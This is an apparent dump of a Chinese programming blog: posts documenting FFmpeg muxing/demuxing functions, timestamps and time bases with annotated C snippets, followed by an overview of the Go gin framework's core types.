avio_open()，是FFmepeg早期版本。avio_open()比avio_open2()少了最后2个参数。而它前面几个参数的含义和avio_open2()是一样的。从源代码中可以看出，avio_open()内部调用了avio_open2()，并且把avio_open2()的后2个参数设置成了NULL，因此它的功能实际上和avio_open2()都是用于打开FFmpeg的输入输出文件的。其源码如下所示：\n1 2 3 4 int avio_open(AVIOContext **s, const char *filename, int flags) { return avio_open2(s, filename, flags, NULL, NULL); } avio_open2() **功能：**打开FFmpeg的输入输出文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /** * Create and initialize a AVIOContext for accessing the * resource indicated by url. * @note When the resource indicated by url has been opened in * read+write mode, the AVIOContext can be used only for writing. * * @param s Used to return the pointer to the created AVIOContext. * In case of failure the pointed to value is set to NULL. * @param url resource to access * @param flags flags which control how the resource indicated by url * is to be opened * @param int_cb an interrupt callback to be used at the protocols level * @param options A dictionary filled with protocol-private options. On return * this parameter will be destroyed and replaced with a dict containing options * that were not found. May be NULL. * @return \u0026gt;= 0 in case of success, a negative value corresponding to an * AVERROR code in case of failure */ int avio_open2(AVIOContext **s, const char *url, int flags, const AVIOInterruptCB *int_cb, AVDictionary **options); 参数：\ns：函数调用成功之后创建的AVIOContext结构体\nurl：输入输出协议的地址\nflags：打开地址的方式。可以选择只读，只写，或者读写，取值如下\nAVIO_FLAG_READ：只读 AVIO_FLAG_WRITE：只写 AVIO_FLAG_READ_WRITE：读写 int_cb：在协议级使用的中断回调\noptions：设置\n返回值：\n成功时返回值大于等于0，出错时对应AVERROR代码\navformat_write_header() avformat_write_header()，av_write_frame()以及av_write_trailer()这三个函数一般是配套使用，其中av_write_frame()用于写视频数据（，avformat_write_header()用于写视频文件头，而av_write_trailer()用于写视频文件尾\n**功能：**写视频文件头\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /** * Allocate the stream private data and write the stream header to * an output media file. * * @param s Media file handle, must be allocated with avformat_alloc_context(). * Its oformat field must be set to the desired output format; * Its pb field must be set to an already opened AVIOContext. * @param options An AVDictionary filled with AVFormatContext and muxer-private options. * On return this parameter will be destroyed and replaced with a dict containing * options that were not found. May be NULL. * * @return AVSTREAM_INIT_IN_WRITE_HEADER on success if the codec had not already been fully initialized in avformat_init, * AVSTREAM_INIT_IN_INIT_OUTPUT on success if the codec had already been fully initialized in avformat_init, * negative AVERROR on failure. * * @see av_opt_find, av_dict_set, avio_open, av_oformat_next, avformat_init_output. */ av_warn_unused_result int avformat_write_header(AVFormatContext *s, AVDictionary **options); 参数：\ns：用于输出的AVFormatContext\noptions：额外的选项，一般为NULL\n返回值：\n函数正常执行后返回值等于0\nav_interleaved_write_frame() **功能：**将数据包写入输出媒体文件，以确保正确的交织。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 /** * Write a packet to an output media file ensuring correct interleaving. * * This function will buffer the packets internally as needed to make sure the * packets in the output file are properly interleaved in the order of * increasing dts. Callers doing their own interleaving should call * av_write_frame() instead of this function. * * Using this function instead of av_write_frame() can give muxers advance * knowledge of future packets, improving e.g. the behaviour of the mp4 * muxer for VFR content in fragmenting mode. * * @param s media file handle * @param pkt The packet containing the data to be written. * If the packet is reference-counted, this function will take * ownership of this reference and unreference it later when it sees * fit. * The caller must not access the data through this reference after * this function returns. If the packet is not reference-counted, * libavformat will make a copy. * This parameter can be NULL (at any time, not just at the end), to * flush the interleaving queues. * Packet\u0026#39;s @ref AVPacket.stream_index \u0026#34;stream_index\u0026#34; field must be * set to the index of the corresponding stream in @ref * AVFormatContext.streams \u0026#34;s-\u0026gt;streams\u0026#34;. * The timestamps (@ref AVPacket.pts \u0026#34;pts\u0026#34;, @ref AVPacket.dts \u0026#34;dts\u0026#34;) * must be set to correct values in the stream\u0026#39;s timebase (unless the * output format is flagged with the AVFMT_NOTIMESTAMPS flag, then * they can be set to AV_NOPTS_VALUE). * The dts for subsequent packets in one stream must be strictly * increasing (unless the output format is flagged with the * AVFMT_TS_NONSTRICT, then they merely have to be nondecreasing). * @ref AVPacket.duration \u0026#34;duration\u0026#34;) should also be set if known. * * @return 0 on success, a negative AVERROR on error. Libavformat will always * take care of freeing the packet, even if this function fails. * * @see av_write_frame(), AVFormatContext.max_interleave_delta */ int av_interleaved_write_frame(AVFormatContext *s, AVPacket *pkt); 参数：\ns：用于输出的AVFormatContext\npkt：包含要写入的数据的包\n返回值：\n函数正常执行后返回值等于0\nav_write_frame() **功能：**输出一帧视音频数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 /** * Write a packet to an output media file. * * This function passes the packet directly to the muxer, without any buffering * or reordering. The caller is responsible for correctly interleaving the * packets if the format requires it. Callers that want libavformat to handle * the interleaving should call av_interleaved_write_frame() instead of this * function. * * @param s media file handle * @param pkt The packet containing the data to be written. Note that unlike * av_interleaved_write_frame(), this function does not take * ownership of the packet passed to it (though some muxers may make * an internal reference to the input packet). * \u0026lt;br\u0026gt; * This parameter can be NULL (at any time, not just at the end), in * order to immediately flush data buffered within the muxer, for * muxers that buffer up data internally before writing it to the * output. * \u0026lt;br\u0026gt; * Packet\u0026#39;s @ref AVPacket.stream_index \u0026#34;stream_index\u0026#34; field must be * set to the index of the corresponding stream in @ref * AVFormatContext.streams \u0026#34;s-\u0026gt;streams\u0026#34;. * \u0026lt;br\u0026gt; * The timestamps (@ref AVPacket.pts \u0026#34;pts\u0026#34;, @ref AVPacket.dts \u0026#34;dts\u0026#34;) * must be set to correct values in the stream\u0026#39;s timebase (unless the * output format is flagged with the AVFMT_NOTIMESTAMPS flag, then * they can be set to AV_NOPTS_VALUE). * The dts for subsequent packets passed to this function must be strictly * increasing when compared in their respective timebases (unless the * output format is flagged with the AVFMT_TS_NONSTRICT, then they * merely have to be nondecreasing). @ref AVPacket.duration * \u0026#34;duration\u0026#34;) should also be set if known. * @return \u0026lt; 0 on error, = 0 if OK, 1 if flushed and there is no more data to flush * * @see av_interleaved_write_frame() */ int av_write_frame(AVFormatContext *s, AVPacket *pkt); 参数：\ns：用于输出的AVFormatContext\npkt：等待输出的AVPacket\n返回值：\n函数正常执行后返回值等于0\nav_write_trailer() **功能：**输出文件尾\n1 2 3 4 5 6 7 8 9 10 /** * Write the stream trailer to an output media file and free the * file private data. * * May only be called after a successful call to avformat_write_header. * * @param s media file handle * @return 0 if OK, AVERROR_xxx on error */ int av_write_trailer(AVFormatContext *s); 参数：\ns：用于输出的AVFormatContext\n返回值：\n函数正常执行后返回值等于0\nav_read_frame() 功能：读取码流中的音频若干帧或者视频一帧\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 /** * Return the next frame of a stream. * This function returns what is stored in the file, and does not validate * that what is there are valid frames for the decoder. It will split what is * stored in the file into frames and return one for each call. It will not * omit invalid data between valid frames so as to give the decoder the maximum * information possible for decoding. * * On success, the returned packet is reference-counted (pkt-\u0026gt;buf is set) and * valid indefinitely. The packet must be freed with av_packet_unref() when * it is no longer needed. For video, the packet contains exactly one frame. * For audio, it contains an integer number of frames if each frame has * a known fixed size (e.g. PCM or ADPCM data). If the audio frames have * a variable size (e.g. MPEG audio), then it contains one frame. * * pkt-\u0026gt;pts, pkt-\u0026gt;dts and pkt-\u0026gt;duration are always set to correct * values in AVStream.time_base units (and guessed if the format cannot * provide them). pkt-\u0026gt;pts can be AV_NOPTS_VALUE if the video format * has B-frames, so it is better to rely on pkt-\u0026gt;dts if you do not * decompress the payload. * * @return 0 if OK, \u0026lt; 0 on error or end of file. On error, pkt will be blank * (as if it came from av_packet_alloc()). * * @note pkt will be initialized, so it may be uninitialized, but it must not * contain data that needs to be freed. */ int av_read_frame(AVFormatContext *s, AVPacket *pkt); 参数：\ns：输入的AVFormatContext\npkt：输出的AVPacket\n返回值：\n成功返回0\nav_free_packet() 功能：释放 packet 占用的资源\n1 2 3 4 5 6 7 8 9 /** * Free a packet. * * @deprecated Use av_packet_unref * * @param pkt packet to free */ attribute_deprecated void av_free_packet(AVPacket *pkt); 参数：\npacket：需要是释放的packet\n新的API：\n1 2 3 4 5 6 7 /** * Convenience function to free all the side data stored. * All the other fields stay untouched. * * @param pkt packet */ void av_packet_free_side_data(AVPacket *pkt); avformat_close_input() 功能：关闭一个AVFormatContext，一般和 avformat_open_input() 成对出现\n1 2 3 4 5 /** * Close an opened input AVFormatContext. Free it and all its contents * and set *s to NULL. */ void avformat_close_input(AVFormatContext **s); avio_close() **功能：**关闭AVIOContext访问的资源并释放（只能用于被 avio_open() 打开的）\n1 2 3 4 5 6 7 8 9 10 11 /** * Close the resource accessed by the AVIOContext s and free it. * This function can only be used if s was opened by avio_open(). * * The internal buffer is automatically flushed before closing the * resource. * * @return 0 on success, an AVERROR \u0026lt; 0 on error. * @see avio_closep */ int avio_close(AVIOContext *s); av_gettime() **功能：**以微秒为单位获取当前时间。\n由于int64_t最大为9,223,372,036,854,775,807，因此会发生溢出的情况，得到的时间戳有正有负\n音视频基础知识 FFmpeg中的时间处理 I、P、B 帧 I 帧、P 帧、B 帧的区别在于：\nI 帧（Intra coded frames）：I 帧图像采用帧内编码方式，即只利用了单帧图像内的空间相关性，而没有利用时间相关性。I 帧使用帧内压缩，不使用运动补偿，由于 I 帧不依赖其它帧，所以是随机存取的入点，同时是解码的基准帧。I 帧主要用于接收机的初始化和信道的获取，以及节目的切换和插入，I 帧图像的压缩倍数相对较低。I 帧图像是周期性出现在图像序列中的，出现频率可由编码器选择。 P 帧（Predicted frames）：P 帧和 B 帧图像采用帧间编码方式，即同时利用了空间和时间上的相关性。P 帧图像只采用前向时间预测，可以提高压缩效率和图像质量。P 帧图像中可以包含帧内编码的部分，即 P 帧中的每一个宏块可以是前向预测，也可以是帧内编码。 B 帧（Bi-directional predicted frames）：B 帧图像采用双向时间预测，可以大大提高压缩倍数。值得注意的是，由于 B 帧图像采用了未来帧作为参考，因此 MPEG-2 编码码流中图像帧的传输顺序和显示顺序是不同的。 也就是说，一个 I 帧可以不依赖其他帧就解码出一幅完整的图像，而 P 帧、B 帧不行。P 帧需要依赖视频流中排在它前面的帧才能解码出图像。B 帧则需要依赖视频流中排在它前面或后面的帧才能解码出图像。\n这就带来一个问题：在视频流中，先到来的 B 帧无法立即解码，需要等待它依赖的后面的 I、P 帧先解码完成，这样一来播放时间与解码时间不一致了，顺序打乱了，那这些帧该如何播放呢？这时就需要我们来了解另外两个概念：DTS 和 PTS\nDTS、PTS 的概念 DTS、PTS 的概念如下所述：\nDTS（Decoding Time Stamp）：即解码时间戳，这个时间戳的意义在于告诉播放器该在什么时候解码这一帧的数据。 PTS（Presentation Time Stamp）：即显示时间戳，这个时间戳用来告诉播放器该在什么时候显示这一帧的数据。 需要注意的是：虽然 DTS、PTS 是用于指导播放端的行为，但它们是在编码的时候由编码器生成的。\n当视频流中没有 B 帧时，通常 DTS 和 PTS 的顺序是一致的。但如果有 B 帧时，就回到了我们前面说的问题：解码顺序和播放顺序不一致了。\n比如一个视频中，帧的显示顺序是：I B B P，现在我们需要在解码 B 帧时知道 P 帧中信息，因此这几帧在视频流中的顺序可能是：I P B B，这时候就体现出每帧都有 DTS 和 PTS 的作用了。DTS 告诉我们该按什么顺序解码这几帧图像，PTS 告诉我们该按什么顺序显示这几帧图像。顺序大概如下：\nPTS: 1 4 2 3 DTS: 1 2 3 4 Stream: I P B B AVRational 主要功能：表示时间刻度 主要信息： 1 2 3 4 5 6 7 /** * Rational number (pair of numerator and denominator). */ typedef struct AVRational{ int num; ///\u0026lt; Numerator int den; ///\u0026lt; Denominator } AVRational;// 标识一个分数，num为分数，den为分母。例如（1,25）表示1s25帧 时间单位 AV_TIME_BASE ffmpeg中的内部计时单位（时间基），ffmepg中的所有时间都是于它为一个单位，比如AVStream中的duration即以为着这个流的长度为duration个AV_TIME_BASE。AV_TIME_BASE定义为：\n1 2 3 4 5 /** * Internal time base represented as integer */ #define AV_TIME_BASE 1000000 AV_TIME_BASE_Q ffmpeg内部时间基的分数表示，实际上它是AV_TIME_BASE的倒数。从它的定义能很清楚的看到这点：\n1 2 3 4 5 /** * Internal time base represented as fractional value */ #define AV_TIME_BASE_Q (AVRational){1, AV_TIME_BASE} av_rescale_q(int64_t a, AVRational bq, AVRational cq) 功能：计算a*bq / cq来把时间戳从一个时间基调整到另外一个时间基。在进行时间基转换的时候，应该首先这个函数，因为它可以避免溢出的情况发生。\nav_rescale_q_rnd(int64_t a, AVRational bq, AVRational cq, enum AVRounding rnd) 1 2 3 4 5 6 7 8 9 /** * Rescale a 64-bit integer by 2 rational numbers with specified rounding. * * The operation is mathematically equivalent to `a * bq / cq`. * * @see av_rescale(), av_rescale_rnd(), av_rescale_q() */ int64_t av_rescale_q_rnd(int64_t a, AVRational bq, AVRational cq, enum AVRounding rnd) av_const; 功能：将以 \u0026ldquo;时钟基c\u0026rdquo; 表示的 数值a 转换成以 \u0026ldquo;时钟基b\u0026rdquo; 来表示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 enum AVRounding { AV_ROUND_ZERO = 0, ///\u0026lt; Round toward zero. AV_ROUND_INF = 1, ///\u0026lt; Round away from zero. AV_ROUND_DOWN = 2, ///\u0026lt; Round toward -infinity. AV_ROUND_UP = 3, ///\u0026lt; Round toward +infinity. AV_ROUND_NEAR_INF = 5, ///\u0026lt; Round to nearest and halfway cases away from zero. /** * Flag telling rescaling functions to pass `INT64_MIN`/`MAX` through * unchanged, avoiding special cases for #AV_NOPTS_VALUE. * * Unlike other values of the enumeration AVRounding, this value is a * bitmask that must be used in conjunction with another value of the * enumeration through a bitwise OR, in order to set behavior for normal * cases. * * @code{.c} * av_rescale_rnd(3, 1, 2, AV_ROUND_UP | AV_ROUND_PASS_MINMAX); * // Rescaling 3: * // Calculating 3 * 1 / 2 * // 3 / 2 is rounded up to 2 * // =\u0026gt; 2 * * av_rescale_rnd(AV_NOPTS_VALUE, 1, 2, AV_ROUND_UP | AV_ROUND_PASS_MINMAX); * // Rescaling AV_NOPTS_VALUE: * // AV_NOPTS_VALUE == INT64_MIN * // AV_NOPTS_VALUE is passed through * // =\u0026gt; AV_NOPTS_VALUE * @endcode */ AV_ROUND_PASS_MINMAX = 8192, }; AV_ROUND_ZERO = 0, // Round toward zero. 趋近于0 AV_ROUND_INF = 1, // Round away from zero. 趋远于0 AV_ROUND_DOWN = 2, // Round toward -infinity. 趋于更小的整数 AV_ROUND_UP = 3, // Round toward +infinity. 趋于更大的整数 AV_ROUND_NEAR_INF = 5, // Round to nearest and halfway cases away from zero. 四舍五入,小于0.5取值趋向0,大于0.5取值趋远于0\nav_q2d() 1 2 3 4 5 6 7 8 9 /** * Convert an AVRational to a `double`. * @param a AVRational to convert * @return `a` in floating-point form * @see av_d2q() */ static inline double av_q2d(AVRational a){ return a.num / (double) a.den; } **功能：**将AVRatioal结构转换成double\nav_usleep() 1 2 3 4 5 6 7 8 9 /** * Sleep for a period of time. Although the duration is expressed in * microseconds, the actual delay may be rounded to the precision of the * system timer. * * @param usec Number of microseconds to sleep. * @return zero on success or (negative) error code. */ int av_usleep(unsigned usec); 功能：发送流媒体的数据的时候需要延时。不然的话，FFmpeg处理数据速度很快，瞬间就能把所有的数据发送出去，流媒体服务器是接受不了的。因此需要按照视频实际的帧率发送数据。本文记录的推流器在视频帧与帧之间采用了av_usleep()函数休眠的方式来延迟发送。这样就可以按照视频的帧率发送数据了。\n根据PTS计算一帧在整个视频中的位置 1 timestamp(秒) = pts * av_q2d(st-\u0026gt;time_base);//st是AVStream的指针，即一帧视频 计算视频长度的方法 1 time(秒) = st-\u0026gt;duration * av_q2d(st-\u0026gt;time_base); 时间基转换公式 timestamp(ffmpeg内部时间戳) = AV_TIME_BASE * time(秒) time(秒) = AV_TIME_BASE_Q * timestamp(ffmpeg内部时间戳) FFmpeg ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/ffmpeg%E5%BC%80%E5%8F%91/","title":"ffmpeg开发"},{"content":"FFmpeg 开发之时间基 前言 在了解FFmpeg中的时间基之前，我们需要了解一些基本概念。\n只有掌握了这些基础概念，我们才能够理解FFmpeg中的时间基以及它们之间的转换。\n基础知识 I、P、B帧 视频压缩中，每帧都代表着一幅静止的图像。而在进行实际压缩时，会采取各种算法以减少数据的容量，其中 IPB 帧就是最常见的一种。\nI 帧、P 帧、B 帧的区别在于：\nI 帧（Intra coded frames）：I 帧图像采用帧内编码方式，即只利用了单帧图像内的空间相关性，而没有利用时间相关性，解码时只需要本帧数据就可以完成。I 帧使用帧内压缩，不使用运动补偿，由于 I 帧不依赖其它帧，所以是随机存取的入点，同时是解码的基准帧。I 帧主要用于接收机的初始化和信道的获取，以及节目的切换和插入，I 帧图像的压缩倍数相对较低。I 帧图像是周期性出现在图像序列中的，出现频率可由编码器选择。 P 帧（Predicted frames）：P 帧和 B 帧图像采用帧间编码方式，即同时利用了空间和时间上的相关性。P 帧图像只采用前向时间预测，P帧没有完整画面数据，只有与前一帧的画面差别的数据，可以提高压缩效率和图像质量。P 帧图像中可以包含帧内编码的部分，即 P 帧中的每一个宏块可以是前向预测，也可以是帧内编码。 B 帧（Bi-directional predicted frames）：B 帧图像采用双向时间预测，即B帧记录的是本帧与前后帧的差别。B帧可以大大提高压缩倍数，但B 帧图像采用了未来帧作为参考，因此 MPEG-2 编码码流中图像帧的传输顺序和显示顺序是不同的。换言之，要解码B帧，不仅要取得之前的缓存画面，还要解码之后的画面，通过前后画面的与本帧数据的叠加取得最终的画面。 可想而知，解码时依赖其他帧的信息越多，说明当前帧的冗余越少，压缩率越高，一个简单的估算可以认为I帧、P帧、B帧的大小比例可达到9∶3∶1。\n这就带来一个问题：在视频流中，先到来的 B 帧无法立即解码，需要等待它依赖的后面的 I、P 帧先解码完成，这样一来播放时间与解码时间不一致了，顺序打乱了，那这些帧该如何播放呢？\n这时就需要我们来引另外两个概念：DTS 和 PTS\nDTS和PTS DTS（Decoding Time Stamp）：解码时间戳，这个时间戳的意义在于告诉播放器该在什么时候解码这一帧的数据。 PTS（Presentation Time Stamp）：显示时间戳，这个时间戳用来告诉播放器该在什么时候显示这一帧的数据。 注意：虽然 DTS、PTS 是用于指导播放端的行为，但它们是在编码的时候由编码器生成的。\n当视频流中没有 B 帧时，通常 DTS 和 PTS 的顺序是一致的。但如果有 B 帧时，就回到了我们前面说的问题：解码顺序和播放顺序不一致了。\n比如一个视频中，帧的顺序是：I B B P，我们在解码 B 帧需要知道 P 帧中信息，因此这几帧的解码顺序可能是：I P B B，这时候就体现出每帧都有 DTS 和 PTS 的作用了。DTS 告诉我们该按什么顺序解码这几帧图像，PTS 告诉我们该按什么顺序显示这几帧图像。例如：\n实际应展示的顺序：I B B P 实际存放的顺序：I P B B 按存放顺序号解码：1 4 2 3 按实际顺序号展示：1 2 3 4 音视频同步 在一个媒体流中，除了视频以外，通常还包括音频。\n在音频中也有 DTS、PTS 的概念，但是音频没有类似视频中 B 帧，不需要双向预测，所以音频帧的 DTS、PTS 顺序是一致的。\n音频视频混合在一起播放，就呈现了我们常常看到的广义的视频。在音视频一起播放的时候，我们通常需要面临一个问题：怎么去同步它们，以免出现画不对声的情况。\n要实现音视频同步，通常需要选择一个参考时钟，参考时钟上的时间是线性递增的，编码音视频流时依据参考时钟上的时间给每帧数据打上时间戳。在播放时，读取数据帧上的时间戳，同时参考当前参考时钟上的时间来安排播放。这里的说的时间戳就是我们前面说的 PTS。\n在项目实践中，我们可以选择：同步视频到音频、同步音频到视频、同步音频和视频到外部时钟。\nFFmpeg中涉及的时间基 基础了解完了，就需要回到我们的 FFmpeg 中来对上面的概念进行操作了。\n音视频的时间基 我们在执行 ffmpeg/ffplay 命令时，可以通过控制台看到几个参数，分别是 tbr, tbn, tbc，这三个参数代表着不同的时间基：\ntbr：通常说的帧率。time base of rate tbn：视频流的时间基。 time base of stream tbc：视频解码的时间基。time base of codec 时间基实际上就是刻度。以帧率为例，如果帧率是 25帧/秒，那么它的时间基（时间刻度）就是 1/25。即两帧之间的时间为 1/25秒。\n如过当前的时间是 100， 时间基是 1/25，那么转成秒的时间就是100 * 1/25 = 4秒。\nAVRational 主要功能： 表示时间刻度 官方定义： 1 2 3 4 5 6 7 /** * Rational number (pair of numerator and denominator). */ typedef struct AVRational{ int num; ///\u0026lt; Numerator int den; ///\u0026lt; Denominator } AVRational;// 标识一个分数，num为分数，den为分母 AV_TIME_BASE 定义： 这FFmpeg 中的内部计时单位（时间基），FFmepg 中的所有时间都是于它为一个单位，比如 AVStream 中的 duration 即以为着这个流的长度为 duration个 AV_TIME_BASE。AV_TIME_BASE 定义为：\n1 2 3 4 5 /** * Internal time base represented as integer */ #define AV_TIME_BASE 1000000 AV_TIME_BASE_Q FFmepg 内部时间基的分数表示，实际上它是 AV_TIME_BASE 的倒数。从它的定义能很清楚的看到这点：\n1 2 3 4 5 /** * Internal time base represented as fractional value */ #define AV_TIME_BASE_Q (AVRational){1, AV_TIME_BASE} AVRounding 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 enum AVRounding { AV_ROUND_ZERO = 0, ///\u0026lt; Round toward zero. AV_ROUND_INF = 1, ///\u0026lt; Round away from zero. AV_ROUND_DOWN = 2, ///\u0026lt; Round toward -infinity. AV_ROUND_UP = 3, ///\u0026lt; Round toward +infinity. AV_ROUND_NEAR_INF = 5, ///\u0026lt; Round to nearest and halfway cases away from zero. /** * Flag telling rescaling functions to pass `INT64_MIN`/`MAX` through * unchanged, avoiding special cases for #AV_NOPTS_VALUE. * * Unlike other values of the enumeration AVRounding, this value is a * bitmask that must be used in conjunction with another value of the * enumeration through a bitwise OR, in order to set behavior for normal * cases. * * @code{.c} * av_rescale_rnd(3, 1, 2, AV_ROUND_UP | AV_ROUND_PASS_MINMAX); * // Rescaling 3: * // Calculating 3 * 1 / 2 * // 3 / 2 is rounded up to 2 * // =\u0026gt; 2 * * av_rescale_rnd(AV_NOPTS_VALUE, 1, 2, AV_ROUND_UP | AV_ROUND_PASS_MINMAX); * // Rescaling AV_NOPTS_VALUE: * // AV_NOPTS_VALUE == INT64_MIN * // AV_NOPTS_VALUE is passed through * // =\u0026gt; AV_NOPTS_VALUE * @endcode */ AV_ROUND_PASS_MINMAX = 8192, }; AV_ROUND_ZERO = 0, // Round toward zero. 趋近于0 AV_ROUND_INF = 1, // Round away from zero. 趋远于0 AV_ROUND_DOWN = 2, // Round toward -infinity. 趋于更小的整数 AV_ROUND_UP = 3, // Round toward +infinity. 趋于更大的整数 AV_ROUND_NEAR_INF = 5, // Round to nearest and halfway cases away from zero. 四舍五入,小于0.5取值趋向0,大于0.5取值趋远于0\nav_rescale_q(int64_t a, AVRational bq, AVRational cq) 功能：计算 a*bq / cq来把时间戳从一个时间基调整到另外一个时间基。在进行时间基转换的时候，应该首先这个函数，因为它可以避免溢出的情况发生。 av_rescale_q_rnd(int64_t a, AVRational bq, AVRational cq, enum AVRounding rnd) **功能：**将以 时间基c 表示的 数值a 转换成以 时间基b 来表示。 定义： 1 2 3 4 5 6 7 8 9 /** * Rescale a 64-bit integer by 2 rational numbers with specified rounding. * * The operation is mathematically equivalent to `a * bq / cq`. * * @see av_rescale(), av_rescale_rnd(), av_rescale_q() */ int64_t av_rescale_q_rnd(int64_t a, AVRational bq, AVRational cq, enum AVRounding rnd) av_const; av_q2d(AVRational a) **功能：**将AVRatioal结构转换成double 定义： 1 2 3 4 5 6 7 8 9 /** * Convert an AVRational to a `double`. * @param a AVRational to convert * @return `a` in floating-point form * @see av_d2q() */ static inline double av_q2d(AVRational a){ return a.num / (double) a.den; } 示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 if (pkt.pts == AV_NOPTS_VALUE) //判断有无PTS值 { AVRational time_basel = ifmt_ctx-\u0026gt;streams[videoindex]-\u0026gt;time_base; //获取视频文件的时间基 int64_t calc_duration = (double)AV_TIME_BASE / av_q2d(ifmt_ctx-\u0026gt;streams[videoindex]-\u0026gt;r_frame_rate); pkt.pts = (double) (frame_index*calc_duration) / (double)(av_q2d(time_basel)*AV_TIME_BASE); pkt.dts = pkt.pts; pkt.duration = (double)calc_duration / (double)(av_q2d(time_basel)*AV_TIME_BASE); } if (pkt.stream_index == videoindex) { //判断帧位置 AVRational time_base = ifmt_ctx-\u0026gt;streams[videoindex]-\u0026gt;time_base; AVRational time_base_q = {1, AV_TIME_BASE}; int64_t pts_time = av_rescale_q(pkt.dts, time_base, time_base_q); int64_t now_time = av_gettime() - start_time; if (pts_time \u0026gt; now_time) // 判断当前时间是否为该帧的放映时间 { av_usleep(pts_time - now_time);//延时 } } 参考： FFmpeg 入门(5)：视频同步\nffmpeg中的时间戳与时间基\n最简单的基于FFmpeg的推流器（以推送RTMP为例）\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/ffmpeg%E5%BC%80%E5%8F%91%E4%B9%8B%E6%97%B6%E9%97%B4%E5%9F%BA/","title":"FFmpeg开发之时间基"},{"content":"类型概览 前言 为了更好的理解 gin 的工作流程，自己决定先熟悉 gin 中暴露的结构体来熟悉大体的工作流，再结合具体示例来深入了解整个工作流程。\n一、Accounts gin/auth.go at v1.7.4 · gin-gonic/gin (github.com)\n1 type Accounts map[string]string Accounts 是一个 map 表的别名，可以配合gin.BasicAuth()中间件进行简单的权限认证。\n二、Context gin/context.go at v1.7.4 · gin-gonic/gin (github.com)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 type Context struct { writermem responseWriter Request *http.Request Writer ResponseWriter Params Params handlers HandlersChain index int8 fullPath string engine *Engine params *Params skippedNodes *[]skippedNode mu sync.RWMutex Keys map[string]interface{} Errors errorMsgs Accepted []string queryCache url.Values formCache url.Values sameSite http.SameSite } Context 是gin框架中最重要的组成部分，整个 Web 应用都是基于Context的来的。Context就像是一个故事的主线，串联起了整个 Web 请求的故事。从请求开始，到中间经历的重重中间件再到具体的路由函数，再到请求结束，都和Context息息相关。\n三、Engine gin/gin.go at v1.7.4 · gin-gonic/gin (github.com)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 type Engine struct { RouterGroup RedirectTrailingSlash bool RedirectFixedPath bool HandleMethodNotAllowed bool ForwardedByClientIP bool AppEngine bool UseRawPath bool UnescapePathValues bool RemoveExtraSlash bool RemoteIPHeaders []string TrustedPlatform string MaxMultipartMemory int64 delims render.Delims secureJSONPrefix string HTMLRender render.HTMLRender FuncMap template.FuncMap allNoRoute HandlersChain allNoMethod HandlersChain noRoute HandlersChain noMethod HandlersChain pool sync.Pool trees methodTrees maxParams uint16 maxSections uint16 trustedProxies []string trustedCIDRs []*net.IPNet } Engine中包含了作用于整个工程的中间件以及配置文件。在有HTTP访问来临时，Engine会找到匹配的路由，然后新建一个Context，对请求进行分发。\n四、Error gin/errors.go at v1.7.4 · gin-gonic/gin (github.com)\n1 2 3 4 5 type Error struct { Err error Type ErrorType Meta interface{} } Error是gin中用于处理错误的结构体，用于处理在框架处理服务过程中出现的错误。\n五、ErrorType gin/errors.go at v1.7.4 · gin-gonic/gin (github.com)\n1 type ErrorType uint64 ErrorType用于定义错误类型，在使用中配合Error类型使用。\n六、H gin/utils.go at v1.7.4 · gin-gonic/gin (github.com)\n1 type H map[string]interface{} 返回响应时将参数传递给H，框架会自动帮我们转换成想要的格式，如json、xml等。\n七、HandlerFunc gin/gin.go at v1.7.4 · gin-gonic/gin (github.com)\n1 type cc func(*Context) HandlerFunc是一种函数类型，中间件以及路由处理都是这种类型的函数。\n八、HandlersChain gin/gin.go at v1.7.6 · gin-gonic/gin (github.com)\n1 type HandlersChain []HandlerFunc HandlersChain是一个存放HandlerFunc的数组，gin通过直接遍历处理这些函数。\n九、IRouter gin/routergroup.go at v1.7.6 · gin-gonic/gin (github.com)\n1 2 3 4 type IRouter interface { IRoutes Group(string, ...HandlerFunc) *RouterGroup } IRouter是路由组接口，在对路由进行分组处理时便会使用到该接口。\n十、IRoutes gin/routergroup.go at v1.7.6 · gin-gonic/gin (github.com)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 type IRoutes interface { Use(...HandlerFunc) IRoutes Handle(string, string, ...HandlerFunc) IRoutes Any(string, ...HandlerFunc) IRoutes GET(string, ...HandlerFunc) IRoutes POST(string, ...HandlerFunc) IRoutes DELETE(string, ...HandlerFunc) IRoutes PATCH(string, ...HandlerFunc) IRoutes PUT(string, ...HandlerFunc) IRoutes OPTIONS(string, ...HandlerFunc) IRoutes HEAD(string, ...HandlerFunc) IRoutes StaticFile(string, string) IRoutes Static(string, string) IRoutes StaticFS(string, http.FileSystem) IRoutes } IRoutes是单路由处理接口。\n十一、LogFormatter gin/logger.go at v1.7.6 · gin-gonic/gin (github.com)\n1 type LogFormatter func(params LogFormatterParams) string LogFormatter定义了处理日志的函数类型。\n十二、LogFormatterParams gin/logger.go at v1.7.6 · gin-gonic/gin (github.com)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 type LogFormatterParams struct { Request *http.Request TimeStamp time.Time StatusCode int Latency time.Duration ClientIP string Method string Path string ErrorMessage string isTerm bool BodySize int Keys map[string]interface{} } LogFormatterParams定义了日志格式化时候使用的参数类型。\n十三、LoggerConfig gin/logger.go at v1.7.6 · gin-gonic/gin (github.com)\n1 2 3 4 5 6 type LoggerConfig struct { Formatter LogFormatter Output io.Writer 